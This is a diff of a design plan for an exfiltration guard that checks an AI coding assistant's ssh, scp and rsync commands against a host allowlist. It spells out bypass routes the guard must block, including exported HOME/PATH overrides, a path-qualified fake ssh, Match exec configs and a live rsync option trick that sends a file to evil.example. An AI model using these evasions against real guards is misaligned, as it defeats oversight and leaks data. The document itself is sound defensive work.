@@ -31,7 +31,9 @@ The fix is to resolve the destination the way ssh itself does, through
 `ssh -G <alias>`, before matching the allowlist, while preserving fail-closed
 behaviour: an alias that resolves to a non-allowlisted host, or that jumps/proxies
 through one, is still blocked, and any failure to resolve falls back to today's
-literal match so the change cannot become more permissive by accident.
+literal match so the change cannot become more permissive by accident. (One
+deliberate exception to "fall back": a config found to carry a command-executing
+directive is *blocked*, not literal-matched — see resolver step 3.)
 
 ## Scope
 
@@ -42,14 +44,21 @@ design doc. Concretely:
    called with the command's captured `env`), resolve each ssh-family destination
    host through `ssh -G` before the existing `_require_lab` allowlist match,
    considering the resolved `hostname`, `proxyjump` and `proxycommand`, subject to
-   the env-override refusal, the pre-`ssh -G` config scan (which *blocks* a config
-   that can execute commands rather than resolving it), the pinned `-o`/`-F`
-   forwarding contract, and the bounded ProxyJump depth/cycle policy. Fold the `-J`
+   the env-override refusal (command-scoped *and* exported earlier on the same
+   line), the trusted-binary rule (never run a path-qualified or non-system `ssh`),
+   the pre-`ssh -G` config scan (which *blocks* a config that can execute commands
+   rather than resolving it), the per-program `-o`/`-F` forwarding contract (nothing
+   forwarded for rsync), running `ssh -G` in the command's effective working
+   directory, and the bounded ProxyJump depth/cycle policy. Fold the `-J`
    jump hops into this same resolve-then-require pass (removing the immediate per-hop
    `_require_lab` call) so a jump-host alias is resolved too. Add `KnownHostsCommand`
    to the refused command-executing `-o` regex. On a resolution failure or an
    unreadable config chain, fall back to the current literal match; a config found to
    carry a command-executing directive is blocked outright.
+   **`.claude/hooks/lib/exfil_bash_dispatch.py`** — pass `env` to
+   `_check_ssh_family`, and track the names exported earlier on the command line
+   (next to the existing `cd` tracking) on the `BashContext` so the step-1 refusal
+   sees `export HOME=…; ssh …` (see "Exported environment").
 2. **A new sibling test module** `.claude/hooks/lib/test_exfiltration_guard_ssh_alias.py`,
    built on the shared `GuardFixture` imported from
    `test_exfiltration_guard_check.py`, covering every case in Success criteria:
@@ -57,7 +66,10 @@ design doc. Concretely:
    a non-allowlisted host (blocked), ProxyCommand alias (blocked), `-J` jump-host
    alias resolving to an allowlisted host (allowed) and to a non-allowlisted host
    (blocked), `-o HostName=` override in both attached and separate spellings and
-   `-F`/`-Ffile` (blocked), `HOME=`/`PATH=` environment overrides (blocked),
+   `-F`/`-Ffile` (blocked), a relative `-F` after a `cd` (resolved in the
+   command's directory), `HOME=`/`PATH=` environment overrides both leading and
+   exported earlier on the line (blocked), a path-qualified ssh executable (not
+   run by the resolver), rsync's own `-F`/`-o` switches (not forwarded),
    `Match exec`/`ProxyCommand` config detection blocking the command — for both a
    cosmetic alias and an allowlisted-literal token — with a sentinel proving no
    execution, ProxyJump cycle termination, and literal fallback on resolution
@@ -117,9 +129,35 @@ Behaviour, in order:
    *overridden* environment would let an attacker-chosen `PATH`/`HOME` pick the
    binary and the config whose `Match exec`/`ProxyCommand` then executes. Fail
    closed: refuse rather than resolve. (This mirrors the existing refusal of
-   rsync transport env.)
-2. **Locate ssh** with `shutil.which("ssh")`. If absent, return `[token]`
-   (literal fallback).
+   rsync transport env.) The same refusal applies when `HOME` or `PATH` was
+   **exported earlier on the same command line** (`export HOME=/tmp/evil; ssh
+   amd-halo`) — see "Exported environment" below; the leading-assignment capture
+   alone cannot see that form. This is a one-time gate on the original command,
+   evaluated before the first resolution, not a per-hop check.
+2. **Locate a trusted ssh, and only ever run that one.** The dispatcher picks the
+   ssh-family branch from `os.path.basename(argv[0])`, so `/tmp/ssh amd-halo` or
+   `./ssh amd-halo` reaches `_check_ssh_family` even though the program that will
+   run is not the `ssh` on `PATH`. The resolver therefore:
+   - when `argv[0]` is path-qualified (contains `/`), does **not** resolve and
+     returns `[token]` (literal fallback). It must never execute the named file:
+     running an assistant-chosen `/tmp/ssh -G` would itself be the command
+     execution step 3 exists to prevent, and resolving through the system `ssh`
+     instead would base the decision on a different program than the one allowed.
+     (That a path-qualified ssh-family program is not scanned at all today is a
+     pre-existing gap, tracked separately as tracker task
+     `dfed2140-25dc-4290-b718-b41d0561236b`.)
+   - otherwise locates `ssh` with `shutil.which("ssh")` and requires its
+     `os.path.realpath` to lie under the dispatcher's `SYSTEM_PREFIXES`
+     (`exfil_bash_dispatch.py`, the same trust rule `_check_program_file` uses).
+     If ssh is absent, or resolves outside those prefixes (an assistant-writable
+     `~/bin/ssh` early on the profile's `PATH`), return `[token]` (literal
+     fallback) — the resolver never executes a non-system ssh.
+   scp and sftp start ssh from a compiled-in path rather than `PATH`, so for them
+   the resolver's ssh may not be byte-for-byte the program they spawn; it reads
+   the same `~/.ssh/config` and `/etc/ssh/ssh_config`, which is what decides the
+   resolved host, so the reported hostname is the same.
+
+   <!-- TODO(review): OpenSSH locates ~/.ssh/config through the passwd home directory, not $HOME; the step-3 scan must read the same file ssh -G reads. -->
 3. **Refuse to run `ssh -G` on a config that can execute a command during
    resolution (thread #3 — the `Match exec` mitigation).** `ssh -G` evaluates
    `Match exec "<command>"` and runs `ProxyCommand`/`LocalCommand`/
@@ -130,7 +168,15 @@ Behaviour, in order:
    step 1 has guaranteed is not overridden), the system `/etc/ssh/ssh_config`,
    any `-F <file>` named on the command line, and every file reachable through
    their `Include` directives (follow includes to a bounded depth, expanding
-   `~` and globs) — for any command-executing directive: `Match exec`,
+   `~` and globs) — for any command-executing directive. Paths are resolved the
+   way ssh resolves them, not relative to the hook process: a relative `-F` path
+   is relative to the **command's effective working directory**
+   (`ctx.command_cwd`, which already tracks a `cd` earlier on the line; when it is
+   unknown, `ctx.require_cwd` blocks, as it does for every other cwd-dependent
+   check), while a relative `Include` path is relative to `~/.ssh` when it appears
+   in a user config (including a `-F` file) and to `/etc/ssh` when it appears in
+   the system config — per `ssh_config(5)`, *not* relative to the cwd. The
+   directives are: `Match exec`,
    `ProxyCommand` (not `none`), `LocalCommand`, `PermitLocalCommand yes` and
    `KnownHostsCommand`. The two outcomes are deliberately different, because
    returning `[token]` is **not** safe when a directive is actually found:
@@ -157,7 +203,10 @@ Behaviour, in order:
 4. **Run `ssh -G <forwarded-options> <alias-without-user@-or-:port>`** with a
    short timeout and captured output, mirroring the `Git.run` error handling:
    any `OSError`/`SubprocessError`/timeout, or a non-zero exit, returns
-   `[token]` (literal fallback). The forwarded options are exactly the set
+   `[token]` (literal fallback). The subprocess runs with `cwd=ctx.command_cwd`,
+   so `cd /tmp; ssh -F config amd-halo-ci` resolves `/tmp/config` — the file the
+   real ssh reads and the file step 3 scanned — not a `config` next to the hook
+   process. The forwarded options are exactly the set
    pinned under "Faithful resolution" below (`-F` and the host/config-selecting
    `-o` values); the routing and command-executing `-o` forms are already
    refused before resolution, so they never reach this call.
@@ -179,8 +228,10 @@ Behaviour, in order:
      invocations across one top-level destination (primary alias + all hops).
    - A `visited` set of hop specs (normalised) is carried; a hop already in
      `visited` is not resolved again (cycle break).
-   Each hop is resolved by the same steps 1–6 (same env refusal, same config
-   scan, same `ssh -G`), and its resolved `hostname` is added to the returned
+   Each hop is resolved by the same steps 2–6 (same trusted ssh, same config
+   scan, same `ssh -G` in the same cwd; the step-1 environment refusal has
+   already been applied once to the whole command), and its resolved `hostname`
+   is added to the returned
    list so `_require_lab` checks it. When the depth cap, the invocation cap, or
    a cycle is hit, stop resolving further hops and add the *literal* hop token
    to the returned list instead (still matched by `_require_lab`, so a
@@ -239,6 +290,37 @@ existing rsync transport-env refusal in `_check_ssh_family`/the dispatcher. Othe
 assignments (`LANG`, `TERM`, a `SendEnv`/`SetEnv`-style variable that only reaches
 the *remote*, …) do not affect local config selection and are left alone.
 
+### Exported environment (review follow-up)
+
+The leading-assignment capture does not see an assignment exported by an earlier
+simple command on the same line: `export HOME=/tmp/evil; ssh amd-halo` and
+`export PATH=/tmp; ssh amd-halo` reach `_check_ssh_family` with an empty `env`,
+while the real ssh runs under the exported values. `_check_exported_env` in
+`exfil_bash_dispatch.py` refuses only git repository-selecting/transport
+variables, rsync transport variables and `TAR_OPTIONS` at the export; `HOME` and
+`PATH` exports are allowed (its own error text even suggests
+`export PATH=$PATH:/x`), and `set -a`/`set -o allexport` is already refused
+outright.
+
+Decision: do **not** refuse `export HOME`/`export PATH` at the export — that would
+block common, harmless lines that never run ssh. Instead, track the names
+exported so far through the command list, the same way the dispatcher's command
+loop in `exfil_bash_dispatch.py` already tracks the effective directory through a
+`cd` (including restoring it when a `( … )` subshell closes), and carry them on
+the `BashContext` handed to `_check_simple_command` (as `ctx.at(cwd)` carries the
+directory today). `export`, `declare -x` and `typeset -x` operands add a name;
+`unset`/`export -n` need not remove one (keeping a name is the fail-closed
+direction). When `HOME` or `PATH` is in that set at an ssh-family command, step 1
+blocks, exactly as for a leading assignment. A substitution body, which is
+analysed after the list, is analysed with the set treated as "unknown", i.e. as
+if both were exported — the analogue of the existing `ctx.at(None)` rule for a
+line that changes directory.
+
+Scope of the tracking: one Bash tool call. Shell state other than the working
+directory does not persist between Bash tool calls, so an export cannot reach an
+ssh in a later call. `source`/`.` of a file that exports is not covered by this
+tracking — see Open questions.
+
 ### Faithful resolution and its options (thread #1 — the exact forwarding contract)
 
 `ssh -G` honours the same config-selecting options the real command would, so the
@@ -282,10 +364,34 @@ both spellings:**
 
 Everything else on the command line (positional host, `-p`/`-l`/`-i`/… transport
 flags that do not select the config) is neither forwarded nor rejected — it does not
-affect which host `ssh -G` reports. scp/sftp use `-F`/`-o` with the same meaning;
-rsync's transport-substituting `-e`/`--rsh` and `RSYNC_RSH` are already refused
-upstream, so rsync-over-ssh destinations reach the resolver as plain
-`[user@]host:path` specs.
+affect which host `ssh -G` reports.
+
+**The contract is per program, not per family (review follow-up).** Today
+`_check_ssh_family` parses every ssh-family program with the one ssh table
+`_SSH_VALUE_FLAGS`, which is right for ssh only:
+
+- **ssh, scp, sftp** — `-F <file>` and `-o <opt>` mean the same thing to all three,
+  so the forwarded set above applies. scp and sftp take different *other* value
+  flags (for example scp's `-l limit`, `-P port`, `-S program`; sftp's `-b
+  batchfile`, `-D server_path`, `-P port`, `-s subsystem`), so each needs its own
+  value-flag table for `_ssh_positionals` rather than ssh's, or a value is
+  misread as a positional (or the reverse).
+- **rsync — forward nothing.** rsync's `-F` (filter-rule shorthand), `-o`
+  (`--owner`), `-p`, `-l`, `-D`, `-c`, `-b`, `-m`, `-S`, `-E`, `-I`, `-P`, … are
+  rsync switches with no argument and no meaning to ssh. rsync passes options to
+  ssh only through `-e`/`--rsh`/`RSYNC_RSH`, which are already refused, so the
+  resolver runs `ssh -G <host>` with **no** forwarded options for an rsync
+  destination; `rsync -F src amd-halo-ci:dst` must not become
+  `ssh -G -F src amd-halo-ci`.
+
+**Prerequisite: rsync's destinations must be parsed with rsync's own option
+table.** Because `_SSH_VALUE_FLAGS` is applied to rsync, the token after any of
+those switches is swallowed as the switch's "value": by reading the code,
+`rsync secret -o evil.example:/tmp/` yields no remote spec, no `_require_lab` call,
+and is allowed today, although rsync (which permutes options) copies `secret` to
+`evil.example`. That is a live bypass independent of aliases, tracked as tracker
+task `6b5e109d-3bce-4e93-aecf-98be2fd954c9`; it should land first (or in the same
+change), because the resolver can only resolve the destinations the parser finds.
 
 The regression tests (see Success criteria) must cover the attached and separate
 spellings of both a forwarded `-o` (`-o HostName=` and `-oHostName=`) and `-F`
@@ -293,11 +399,16 @@ spellings of both a forwarded `-o` (`-o HostName=` and `-oHostName=`) and `-F`
 
 ### Why this is not a new exfiltration vector
 
-The ssh binary the resolver runs (`shutil.which("ssh")`) is the same ssh that will
-execute the real command afterwards, reading the same `~/.ssh/config`. If an
-environment could make `ssh -G` report a false hostname, that same environment
-already controls where the real `ssh` connects — so resolution introduces no
-discrepancy an attacker could exploit, and the guard's existing fail-closed
+The resolver runs `ssh -G` only when the command itself runs the `ssh` found on
+`PATH` (a bare `ssh`/`scp`/`sftp`/`rsync`, never a path-qualified program), only
+when that ssh is a system binary, only when neither `HOME` nor `PATH` is changed
+for the command (leading or exported), and in the command's own working
+directory — so it reads the same `~/.ssh/config`, `-F` file and system config the
+real command reads. Under those conditions an environment that could make
+`ssh -G` report a false hostname already controls where the real `ssh` connects,
+so resolution introduces no discrepancy an attacker could exploit; whenever one
+of the conditions does not hold, the resolver does not run and today's literal
+match decides (or the command is blocked). The guard's existing fail-closed
 posture is preserved: resolution only ever *adds* a block (a bad HostName,
 ProxyJump or ProxyCommand) or defers to the literal match it replaces.
 
@@ -324,7 +435,15 @@ faithful, least-mocking approach: the fixture writes a small fake `ssh`
 executable into a temp directory and prepends it to `PATH` for the duration of the
 test, so `shutil.which("ssh")` finds it and it emits canned `-G` output keyed on
 the alias argument (and exits non-zero for the "resolution failure" case). This
-exercises the real subprocess path end to end. A new sibling module is used rather
+exercises the real subprocess path end to end. Because step 2 refuses to run an
+ssh outside `SYSTEM_PREFIXES`, and the fixture's temp directory is outside them,
+the trusted-location rule needs a seam: keep the trusted prefixes in one
+module-level name the resolver reads (or locate ssh through one module-level
+function, as `exfil_bash_dispatch.shutil_which` already is) so a test can add the
+fixture directory for its duration. One test must leave the seam alone and prove
+the converse: a fake `ssh` placed first on `PATH` outside the trusted prefixes is
+**not executed** (its sentinel file is never created) and the literal match
+decides. A new sibling module is used rather
 than extending `test_exfiltration_guard_check.py`, which is already 1591 lines
 against the 1600-line hard limit; the existing `test_exfiltration_guard_transport.py`
 establishes the sibling-module-on-shared-`GuardFixture` pattern, and CI already
@@ -380,9 +499,27 @@ A reviewer confirms the task is done when:
   back to a literal match: an allowlisted literal (`ssh amd-halo`) is still
   allowed and a non-allowlisted literal (`ssh evil.example`) is still blocked —
   i.e. identical to today's behaviour.
+- `export HOME=/tmp/evil; ssh amd-halo` and `export PATH=/tmp; ssh amd-halo` are
+  **blocked** (the exported form of the step-1 refusal), while `export
+  PATH=$PATH:/x; ls` (no ssh on the line) and `export EDITOR=vim; ssh amd-halo`
+  are unaffected.
+- A path-qualified ssh executable is **not run by the resolver**: with a sentinel
+  script at `/tmp/ssh`, `/tmp/ssh amd-halo-ci` falls back to the literal match
+  (blocked, alias not allowlisted) and the sentinel is never created; likewise a
+  fake `ssh` first on `PATH` but outside `SYSTEM_PREFIXES` is never executed.
+- The resolver honours the command's working directory: `cd <dir>; ssh -F config
+  amd-halo-ci`, where `<dir>/config` maps the alias to a non-allowlisted host, is
+  **blocked**, and the same with a `<dir>/config` that maps it to `amd-halo` is
+  **allowed** — even when a different `config` file sits in the hook process's
+  directory. A relative `-F` after a `cd` to a computed target is blocked by
+  `ctx.require_cwd`.
+- rsync forwards nothing: `rsync -F src/ amd-halo-ci:dst/` resolves `amd-halo-ci`
+  with no `-F` passed to `ssh -G` (allowed when it maps to `amd-halo`), and the
+  prerequisite parser fix makes `rsync src -o evil.example:/tmp/` **blocked**.
 - The same cases hold for `scp`/`rsync`-over-ssh destinations.
-- The existing ssh/scp/rsync tests in `test_exfiltration_guard_check.py` and
-  `test_exfiltration_guard_transport.py` still pass unchanged (no regression to
+- The existing ssh/scp/rsync tests in every existing `test_exfiltration_guard_*.py`
+  module (`_check`, `_transport`, `_interpreter`, `_worktree`, `_pinning`) still
+  pass unchanged (no regression to
   literal allowlisted hosts, *literal* jump-host `-J` handling — a literal
   non-allowlisted `-J` hop is still blocked and a literal allowlisted one still
   allowed, now via the resolver's literal fallback rather than the removed immediate
@@ -412,9 +549,22 @@ network tests). CI runs all `test_exfiltration_guard_*.py` modules via
   one of those files, so this change trips that check and the implementing job
   must run the workflow with `override_integrity_checks` set (see the verified
   dependency note under "Resolved review decisions"). This is distinct from the
-  CI-file lock: a guard-library
-  change is not under `check-ci-file-lock.sh` (which covers `.github/workflows/`
-  and `tools/ci/`), so no `ci/...` branch name is required.
+  CI-file lock: a guard-library change is not under `check-ci-file-lock.sh`
+  (which covers `.github/workflows/` and `tools/ci/`), so a `ci/...` branch name
+  is not *required*. Note, though, that `exfil_bash_network.py` and
+  `exfil_bash_dispatch.py` are also in the `PROTECTED_FILES` list of the
+  "Check for enforcement infrastructure tampering" step in
+  `.github/workflows/analysis.yaml`, so on a non-`ci/` branch that step fails too
+  unless the same `override_integrity_checks` input is set. A `ci/...` branch is
+  the alternative: it lifts both that tampering check and CHECK 3 for files
+  under `.claude/hooks/` without an override (see the root `CLAUDE.md`, "Rules
+  That Cannot Be Bypassed", item 2). Which route to take is the owner's call.
+- **Prerequisite (separate task):** the rsync option-parsing fix,
+  `6b5e109d-3bce-4e93-aecf-98be2fd954c9` (see "Faithful resolution"). Without it,
+  rsync destinations hidden behind an rsync switch never reach the resolver.
+- **Related (separate task):** the path-qualified ssh-family scan gap,
+  `dfed2140-25dc-4290-b718-b41d0561236b`. This plan only guarantees the resolver
+  never *runs* such a program; scanning or refusing it is that task.
 
 ## Resolved review decisions
 
@@ -454,6 +604,24 @@ to the implementer's discretion):
 5. **No pinned release number** (thread #5). The release line now refers to the root
    `pom.xml` `<version>` instead of a concrete number.
 
+A third review round raised four more points, settled the same way:
+
+6. **Which ssh the resolver runs.** Settled in resolver step 2: never a
+   path-qualified program and never one outside `SYSTEM_PREFIXES`; either case
+   is a literal fallback. The pre-existing scan gap for path-qualified
+   ssh-family programs is a separate task.
+7. **Working directory.** Settled in resolver steps 3 and 4: a relative `-F` is
+   resolved, scanned and passed to `ssh -G` relative to `ctx.command_cwd`, and
+   `ssh -G` runs with that cwd; relative `Include` paths follow `ssh_config(5)`
+   (`~/.ssh` or `/etc/ssh`), not the cwd — the review's suggestion to resolve
+   `Include` against the cwd would not match what ssh does.
+8. **Exported `HOME`/`PATH`.** Settled in "Exported environment": exported names
+   are tracked through the command line and the step-1 refusal applies to them;
+   the export itself stays allowed.
+9. **Per-program forwarding.** Settled in "Faithful resolution": the `-F`/`-o`
+   forwarding applies to ssh/scp/sftp, each parsed with its own value-flag table;
+   rsync forwards nothing, and its parser fix is a prerequisite task.
+
 Separately, a verified dependency (not an open question): **`verify-exfiltration-guard.sh`
 base-branch comparison.** The verifier's `GUARD_FILES` list includes
 `exfil_bash_network.py` and `test_exfiltration_guard_check.py`, and its CHECK 3
@@ -467,12 +635,51 @@ edit to `exfil_bash_network.py` (and any new case added to
 `test_exfiltration_guard_check.py`) is what requires the override. This is a
 dependency to satisfy at submission time, not a reason to weaken the check.
 
+## Open questions for the approver
+
+These are not defects in the plan; they are trade-offs the person approving it
+should decide deliberately.
+
+1. **The config scan blocks every ssh-family command when any host block has a
+   command-executing directive.** The step-3 scan is necessarily whole-file: which
+   `Host`/`Match` block applies cannot be known without running `ssh -G`, which is
+   what the scan guards. So a `~/.ssh/config` with a `ProxyCommand` or `Match exec`
+   for an *unrelated* host blocks `ssh amd-halo` too — a regression from today,
+   where that command is allowed. Fail-closed and consistent with the
+   assistant-is-the-adversary threat model, but it may disable lab access on a
+   node whose owner uses `ProxyCommand` elsewhere. Options: accept it (and test
+   it explicitly); narrow the scan to the blocks that precede and could match the
+   destination by a pure textual `Host` pattern match, treating any `Match` block
+   as matching; or limit blocking to directives in the files the assistant can
+   write. A lab node's real config should be checked before deciding.
+2. **Should the new test module be protected like its siblings?** Every existing
+   `test_exfiltration_guard_*.py` module is listed in `GUARD_FILES` in
+   `tools/ci/agent-protection/verify-exfiltration-guard.sh` and in the tampering
+   step's `PROTECTED_FILES` in `.github/workflows/analysis.yaml`. The plan's new
+   `test_exfiltration_guard_ssh_alias.py` is not, so a later branch could weaken
+   it without either check noticing. Adding it is a `ci/...`-branch change to both
+   lists; recommended, but it widens the change into the CI-locked files.
+3. **`source`/`.` of a file that exports `HOME`/`PATH`** before an ssh on the same
+   line is not covered by the exported-name tracking. Whether the guard already
+   scans sourced files enough to see the export should be checked at
+   implementation time; if not, treating a `source`/`.` as exporting both names
+   (fail closed) is the simple answer.
+4. **The tracker task's description is behind the plan.** Task
+   `7f7b02cb-0001-460e-82d0-35e6cdba4486` still describes a detected `Match exec`
+   as a literal fallback, while the plan (after review) blocks it, and it does not
+   mention the exported-environment, cwd, trusted-ssh or per-program forwarding
+   rules. The plan is the authoritative contract; the task description should be
+   refreshed when the plan is approved.
+
 ## Estimated complexity
 
-**Small–moderate.** The resolver plus an execution-free config-chain scanner and a
-bounded ProxyJump walk are added to `exfil_bash_network.py`; `_check_ssh_family`
-gains an `env` parameter (threaded through from the dispatcher) and its final loop
-expands each host through the resolver; the command-executing `-o` refusal regex
-gains `KnownHostsCommand`; one new test module; and a two-sentence doc note. No API
-changes beyond the internal `_check_ssh_family` signature, no new Maven/Python
-module, no production-code changes outside the hook library.
+**Moderate.** The resolver plus an execution-free config-chain scanner (with
+ssh's own relative-path rules), a trusted-ssh check and a bounded ProxyJump walk
+are added to `exfil_bash_network.py`; `_check_ssh_family` gains an `env`
+parameter and per-program value-flag tables, and its final loop expands each host
+through the resolver; the dispatcher threads `env` through and tracks exported
+names alongside the `cd` tracking on `BashContext`; the command-executing `-o`
+refusal regex gains `KnownHostsCommand`; one new test module; and a two-sentence
+doc note. The rsync parser fix is a separate prerequisite task. No API changes
+beyond the internal `_check_ssh_family` signature and `BashContext`, no new
+Maven/Python module, no production-code changes outside the hook library.
